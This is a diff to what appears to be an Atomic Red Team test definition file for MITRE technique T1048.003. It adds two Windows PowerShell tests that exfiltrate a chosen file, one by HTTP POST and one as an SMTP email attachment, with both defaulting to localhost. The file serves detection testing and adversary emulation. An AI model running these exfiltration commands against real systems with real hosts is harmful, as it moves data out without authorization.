@@ -67,3 +67,50 @@ atomic_tests:
       
           cat output_file | cut -d "A" -f 2 | cut -d " " -f 2 | cut -d "." -f 1 | sort | uniq | xxd -p -r
     name: manual
+- name: Exfiltration Over Alternative Protocol - HTTP
+  description: |
+     Exfiltration of specified file over HTTP protocol.
+     Upon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+     $content = Get-Content #{input_file}
+     Invoke-WebRequest -Uri #{server_url} -Method POST -Body $content
+    name: powershell
+  input_arguments:
+    input_file:
+      description: Path to file to exfiltrate
+      type: Path
+      default: C:\Windows\System32\notepad.exe
+    server_url:
+      description: The URL of the server to send data to
+      type: String
+      default: "http://127.0.0.1"
+- name: Exfiltration Over Alternative Protocol - SMTP
+  description: |
+     Exfiltration of specified file over SMTP protocol.
+     Upon successful execution, powershell will send an email with a specified file as an attachment to a remote address (default 127.0.0.1). Results will be via stdout.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+          Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1048.003 Test" -Attachments #{input_file} -SmtpServer #{ip_address}
+    name: powershell
+  input_arguments:
+    sender:
+      description: The email address of the sender
+      type: String
+      default: "test@corp.com"
+    receiver:
+      description: The email address of the receiver
+      type: String
+      default: "test@corp.com"
+    input_file:
+      description: Path to file to exfiltrate
+      type: Path
+      default: C:\Windows\System32\notepad.exe
+    ip_address:
+      description: Destination IP address where the data should be sent.
+      type: String
+      default: 127.0.0.1
